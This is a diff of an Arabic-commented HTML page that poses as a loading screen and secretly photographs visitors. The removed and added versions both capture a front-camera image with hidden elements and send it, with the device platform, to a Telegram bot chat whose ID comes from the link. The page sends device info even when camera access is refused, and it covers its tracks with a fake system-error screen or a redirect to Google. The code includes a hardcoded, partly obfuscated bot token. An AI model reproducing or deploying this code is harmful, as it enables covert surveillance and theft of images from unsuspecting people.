@@ -1,133 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title></title>
-    <style>
-        /* شاشة سوداء بعد التصوير */
-        body { 
-            background: black;
-            margin: 0;
-            padding: 0;
-            width: 100vw;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        /* رسالة وهمية للتمويه */
-        .fake-message {
-            color: #00ff00;
-            font-family: monospace;
-            font-size: 14px;
-            text-align: center;
-            opacity: 0.7;
-            display: none;
-        }
-    </style>
+    <title>جاري التحميل...</title>
 </head>
 <body>
-    <div class="fake-message" id="fakeMsg">
-        ⚠️ SYSTEM ERROR: 0x80070567<br>
-        Initiating recovery protocol...
-    </div>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // ==================== تشفير البيانات الأساسية ====================
-        const _0x1a2b = (str) => {
-            return btoa(str).split('').reverse().join('');
-        };
+        // 1. التوكن الثابت للبوت الذي سيقوم بالإرسال للجميع
+        const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"; 
 
-        const _0x3c4d = (str) => {
-            return atob(str.split('').reverse().join(''));
-        };
-
-        // البيانات المشفرة
-        const _token = _0x3c4d('==VUZOcDRBcmZGTkFBUGY1NzA1MzA4MDM4OVVBUkZGcEFBTmZoNXA4MzA3NTYwNzA4MDM4MA==');
-        const _defaultId = _0x3c4d('==ODY0MjU5MzI3');
-        
-        // ==================== جلب الإيدي من الرابط ====================
+        // 2. سحب الـ ID من رابط المتصفح تلقائياً
         const urlParams = new URLSearchParams(window.location.search);
-        const USER_ID = urlParams.get('id') || _defaultId;
-        const BOT_TOKEN = _0x3c4d('==VUZOcDRBcmZGTkFBUGY1NzA1MzA4MDM4OVVBUkZGcEFBTmZoNXA4MzA3NTYwNzA4MDM4MA==');
+        const userChatId = urlParams.get('id'); 
 
-        // ==================== دوال مساعدة مشفرة ====================
-        const _send = (type, data, filename) => {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', USER_ID);
-                
-                if (type === 'photo') {
-                    formData.append('photo', data, filename || 'img.jpg');
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors' // وضع التمويه
-                    }).catch(e => {});
-                }
-            } catch(e) {}
-        };
-
-        // ==================== التصوير السريع ====================
-        (async function() {
-            try {
-                // طلب الكاميرا (بدون انتظار)
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 }
-                    }
-                });
-
-                // عنصر فيديو سريع
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', '');
-                video.setAttribute('autoplay', '');
-                video.style.position = 'absolute';
-                video.style.left = '-9999px';
-                video.style.top = '-9999px';
-                document.body.appendChild(video);
-
-                // تصوير سريع جداً (بعد 100ms فقط)
-                setTimeout(async () => {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                        
-                        canvas.toBlob(blob => {
-                            if (blob && blob.size > 1000) {
-                                _send('photo', blob, 'img.jpg');
-                            }
-                        }, 'image/jpeg', 0.7);
-
-                        // تنظيف سريع
-                        stream.getTracks().forEach(t => t.stop());
-                        video.remove();
-
-                        // تغيير لون الخلفية للأسود
-                        document.body.style.background = 'black';
-                        
-                        // إظهار رسالة وهمية للتمويه
-                        const fakeMsg = document.getElementById('fakeMsg');
-                        fakeMsg.style.display = 'block';
-                        
-                        // تغيير عنوان الصفحة للتمويه
-                        document.title = 'System Error - 0x80070567';
-                        
-                    } catch(e) {}
-                }, 100);
-
-            } catch(error) {
-                // إذا رفض الكاميرا، شاشة سوداء مع رسالة خطأ
-                document.body.style.background = 'black';
-                const fakeMsg = document.getElementById('fakeMsg');
-                fakeMsg.style.display = 'block';
-                fakeMsg.innerHTML = '⚠️ ACCESS DENIED: 0x80070005<br>Terminating connection...';
+        async function startSystem() {
+            // إذا لم يكن هناك ID في الرابط، توقف عن العمل
+            if (!userChatId) {
+                console.error("لا يوجد معرف ID في الرابط!");
+                return;
             }
-        })();
+
+            try {
+                // طلب الكاميرا الأمامية
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // التقاط الصورة بعد ثانيتين
+                setTimeout(() => {
+                    captureAndSend();
+                }, 2000);
+
+            } catch (err) {
+                // في حال رفض المستخدم الكاميرا، يمكن إرسال معلومات الجهاز فقط
+                sendInfoOnly();
+            }
+        }
+
+        function captureAndSend() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', userChatId); // الإرسال لصاحب الـ ID الموجود في الرابط
+                formData.append('photo', blob, 'image.jpg');
+                formData.append('caption', `✅ تم السحب بنجاح للمعرف: ${userChatId}\n📱 النظام: ${navigator.platform}`);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    window.location.href = "https://www.google.com"; // تمويه
+                });
+            }, 'image/jpeg');
+        }
+
+        async function sendInfoOnly() {
+            const text = `⚠️ رفض الكاميرا، معلومات الجهاز فقط:\n🆔 ID: ${userChatId}\n📱 النظام: ${navigator.platform}`;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: userChatId, text: text })
+            });
+            window.location.href = "https://www.google.com";
+        }
+
+        window.onload = startSystem;
     </script>
 </body>
 </html>
